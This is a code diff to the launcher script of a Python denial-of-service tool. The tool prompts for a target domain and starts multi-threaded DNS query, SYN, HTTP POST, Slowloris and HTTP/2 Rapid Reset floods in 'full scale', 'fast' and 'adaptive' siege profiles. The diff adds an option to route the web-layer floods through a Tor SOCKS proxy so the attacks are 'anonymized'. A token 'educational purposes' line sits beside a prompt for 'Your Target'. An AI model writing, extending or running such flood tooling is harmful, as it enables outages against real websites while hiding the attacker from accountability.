@@ -14,7 +14,7 @@ def launch_attack_thread(target_func, args_tuple):
     return thread
 
 
-def full_scale_counter_strike(target):
+def full_scale_counter_strike(target, use_proxy):
     """
     Launches a MASSIVE, PROLONGED, blended, multi-threaded counter-attack.
     This is a siege designed to run for a long time.
@@ -52,11 +52,15 @@ def full_scale_counter_strike(target):
     print("[+] Preparing L7 vectors (DNS Query, POST Flood, Slowloris, H2 Reset)...")
     args = (target, params["duration"], stop_event, pause_event, params["threads"])  # DNS Query
     attack_threads.append(launch_attack_thread(counter_strike_helper.attack_dns_query_flood, args))
-    for port in [80, 443, 8080]:  # HTTP POST
-        args = (target, port, params["duration"], stop_event, pause_event, params["threads"])
+    if use_proxy: print("[PROXY] HTTP POST and Slowloris attacks will be routed through the proxy.")
+
+    # HTTP POST (Proxy-aware)
+    for port in [80, 443, 8080]:
+        args = (target, port, params["duration"], stop_event, pause_event, params["threads"], use_proxy)
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_post, args))
-    for port in [80, 443]:  # Slowloris
-        args = (target, port, params["duration"], stop_event, pause_event, params["slowloris_sockets"])
+    # Slowloris (Proxy-aware)
+    for port in [80, 443]:
+        args = (target, port, params["duration"], stop_event, pause_event, params["slowloris_sockets"], use_proxy)
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_slowloris, args))
     for port in [443, 8443]:  # H2 Reset
         args = (target, port, params["duration"], stop_event, pause_event, params["h2_threads"])
@@ -70,7 +74,7 @@ def full_scale_counter_strike(target):
         stop_event.set()
 
 
-def fast_scale_counter_strike(target):
+def fast_scale_counter_strike(target, use_proxy):
     """
     Launches a FAST, INTENSE, blended, multi-threaded counter-attack.
     Includes the more effective HTTP POST and H2 Rapid Reset floods.
@@ -94,7 +98,7 @@ def fast_scale_counter_strike(target):
         target, port, params["duration"], stop_event, pause_event, params["threads"])))
     for port in [80, 443]:  # HTTP POST
         attack_threads.append(launch_attack_thread(counter_strike_helper.attack_http_post, (
-        target, port, params["duration"], stop_event, pause_event, params["threads"])))
+        target, port, params["duration"], stop_event, pause_event, params["threads"], use_proxy)))
     # NEW: HTTP/2 Rapid Reset
     attack_threads.append(launch_attack_thread(counter_strike_helper.attack_h2_rapid_reset, (
     target, 443, params["duration"], stop_event, pause_event, params["h2_threads"])))
@@ -109,7 +113,7 @@ def fast_scale_counter_strike(target):
         stop_event.set()
 
 
-def adaptive_strike(target):
+def adaptive_strike(target, use_proxy):
     """Launches a 'Fast Scale' profile managed by an adaptive controller."""
     print("=" * 60 + "\nMODE: ADAPTIVE COUNTER-STRIKE (SMART STRIKE)\n" + "=" * 60)
     try:
@@ -129,7 +133,7 @@ def adaptive_strike(target):
     attack_profile = [
         (counter_strike_helper.attack_dns_query_flood, (target, total_duration, stop_event, pause_event, threads)),
         (counter_strike_helper.synflood, (target, 80, total_duration, stop_event, pause_event, threads)),
-        (counter_strike_helper.attack_http_post, (target, 80, total_duration, stop_event, pause_event, threads)),
+        (counter_strike_helper.attack_http_post, (target, 80, total_duration, stop_event, pause_event, threads, use_proxy)),
         # NEW: HTTP/2 Rapid Reset
         (counter_strike_helper.attack_h2_rapid_reset,
          (target, 443, total_duration, stop_event, pause_event, h2_threads)),
@@ -158,22 +162,30 @@ if __name__ == "__main__":
     print("This tool is for educational purposes ONLY. Use responsibly and legally.")
     target_domain = str(input("Please Enter The Domain Name Of Your Target: "))
 
+    # NEW: Ask user if they want to enable the SOCKS proxy (Tor)
+    proxy_choice = input("Enable SOCKS Proxy (Tor) for L7 attacks (y/n): ").lower()
+    proxy_enabled = True if proxy_choice == 'y' else False
+    if proxy_enabled:
+        print("[!] Proxy enabled. L7 attacks will be slower but anonymized.")
+        print("[!] Ensure the Tor service (or other SOCKS5 proxy) is running on 127.0.0.1:9050.")
+
     try:
         options_text = """
-Select an Attack Profile:
-  1: Full Scale Counterstrike (Max-power siege with all L3-L7 vectors including Fragmentation)
-  2: Fast Counterstrike (Short, intense burst with modern L7 vectors)
-  3: Adaptive Counterstrike (Smart, responsive attack with modern L7 vectors)
+    Select an Attack Profile:
+      1: Full Scale Counterstrike (Max-power siege with all vectors)
+      2: Fast Counterstrike (Short, intense burst with modern vectors)
+      3: Adaptive Counterstrike (Smart, responsive attack)
 
-Please enter your option: """
+    Please enter your option: """
         options = int(input(options_text))
 
+        # Pass the proxy_enabled flag to the chosen profile function
         if options == 1:
-            full_scale_counter_strike(target_domain)
+            full_scale_counter_strike(target_domain, proxy_enabled)
         elif options == 2:
-            fast_scale_counter_strike(target_domain)
+            fast_scale_counter_strike(target_domain, proxy_enabled)
         elif options == 3:
-            adaptive_strike(target_domain)
+            adaptive_strike(target_domain, proxy_enabled)
         else:
             print("Invalid option selected. Exiting.")
 
